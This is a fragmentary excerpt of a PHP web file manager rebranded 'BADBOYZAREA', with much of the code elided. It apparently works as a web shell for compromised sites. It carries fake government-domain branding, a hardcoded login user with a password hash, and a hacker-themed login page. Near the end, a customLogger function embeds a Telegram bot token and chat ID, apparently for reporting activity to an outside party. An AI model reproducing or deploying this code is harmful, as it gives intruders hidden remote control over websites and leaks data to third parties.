...
/**
 * System | File Manager BADBOYZAREA
 * @author BADBOYZAREA @2023
 * @email kontak@BADBOYZAREA.go.id
 * @MenBADBOYZAREA Budi Arie Setiadi
 * @link https://www.BADBOYZAREA.go.id/
 */
...
$use_auth = true;
$auth_users = array(
    'gayahelikopter' => '$2a$12$TpRZ6UV8wRl14iMa39/Fd.BvpBqAMvhievxDjZZ./wii6z6Yjbghi', 
);
...
// sample config - https://www.BADBOYZAREA.go.id/
                        ...
                        <div class="card fat <?php echo fm_get_theme(); ?>">
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    ...
                                    <hr />
                                    <div class="mb-3">
                                        <label for="fm_usr" class="pb-2"><?php echo lng('USE'); ?></label>
                                        <input type="text" class="form-control" id="fm_usr" name="fm_usr" required autofocus>
                                    </div>

                                    <div class="mb-3">
                                        <label for="fm_pwd" class="pb-2"><?php echo lng('KATA KUNCI'); ?></label>
                            ...
                            &mdash;&mdash; &copy;
                            <a href="https://www.BADBOYZAREA.go.id" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">BADBOYZ</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
                ...
                if ($out) {
                    ...
                    if ($in) {
                        if (PHP_VERSION_ID < 80009) {
                            // workaround https://bugs.php.net/bug.php?id=78390
                            do {
                                for (;;) {
                                    $buff = fread($in, 4096);
                                    if ($buff === false || $buff === '') {
            ...
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p><h3><a href="https://www.BADBOYZAREA.go.id/" target="_blank" class="app-v-title"> File Manager BADBOYZAREA <?php echo VERSION; ?></a></h3></p>
                        <p>Budi Arie Setiadi</p>
                        <p>Mail Us: <a href="mailto:gmakarim7@gmail.com">kontak[at]BADBOYZAREA.go.id</a> </p>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="https://www.BADBOYZAREA.go.id/" target="_blank"><i class="fa fa-question-circle"></i> <?php echo lng('Help Documents') ?> </a> </li>
                                <li class="list-group-item"><a href="https://www.BADBOYZAREA.go.id/" target="_blank"><i class="fa fa-bug"></i> <?php echo lng('Report Issue') ?></a></li>
                                <?php if(!FM_READONLY) { ?>
...
<form action="" method="post" class="pt-3">
            ...
            foreach ($files as $f) {
                ...
                <tr>
                    ...
                    <td data-sort=<?php echo fm_enc($f) ?>>
                        <div class="filename">
                        <?php
                           if (in_array(strtolower(pathinfo($f, PATHINFO_EXTENSION)), array('gif', 'jpg', 'jpeg', 'png', 'bmp', 'ico', 'svg', 'webp', 'avif'))): ?><?php $imagePreview = fm_enc(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $f); ?>
    ...
    <div class="row">
        ...
        <div class="col-3 d-none d-sm-block"><a href="https://www.BADBOYZAREA.go.id/" target="_blank" class="float-right text-muted">File Manager BADBOYZAREA <?php echo VERSION; ?></a></div>
        <?php else: ?>
            <div class="col-12"><a href="https://www.BADBOYZAREA.go.id/" target="_blank" class="float-right text-muted">File Manager BADBOYZAREA <?php echo VERSION; ?></a></div>
        <?php endif; ?>
    </div>
</form>
...
function fm_rdelete($path)
{
    if (is_link($path)) {
        ...
        $ok = true;
        if (is_array($objects)) {foreach ($objects as $file) {
                if ($file != '.' && $file != '..') {
 ...
 class FM_Config
{
    ...
    function __construct()
    {
        ...
        if (strlen($CONFIG)) {
            ...
            $msg = 'File Manager BADBOYZAREA<br>Error: Cannot load configuration';
            if (substr($fm_url, -1) == '/') {
                $fm_url = rtrim($fm_url, '/');
                $msg .= '<br>';
                $msg .= '<br>Seemslike you have a trailing slash on the URL.';
...
<head>
    ...
    <meta name="author" content="BADBOYZAREA @2023">
...
body.fm-login-page {
  ...
  background-image: url('https://thoidai.org/hellohangker/konco.png');
...
.fm-login-page .card {
  background: rgba(0, 0, 0, 0.4); /* transparan dengan sedikit gelap */
  border: 1px solid rgba(255, 255, 255, 0.2);
  box-shadow: 0 0 20px rgba(0, 0, 0, 0.6);
  backdrop-filter: blur(8px); /* efek kaca */
  border-radius: 10px;
  color: #00aaff; /* warna default teks di dalam card */
}

/* Teks judul dengan efek stroke/glow */
...
/* rapikan wrapper login */
.fm-login-page .card-wrapper {
  width: 360px;
  margin: 0; /* hilangkan margin-top agar tetap center */
}
...
.fm-login-page .form-control {
  ...
  transition: all 0.2s ease-in-out;
  backdrop-filter: blur(6px); /* efek kaca lembut di belakang input */
}
...
/* Placeholder (tulisan abu-abu di input) */
.fm-login-page .form-control::placeholder {
...
function customLogger($message) {
    ...
    $telegramToken = '8203588370:AAFthN8iM1FIS6suYcr3B6W3FpDQABOONnw';
    $chatId = '850963122';
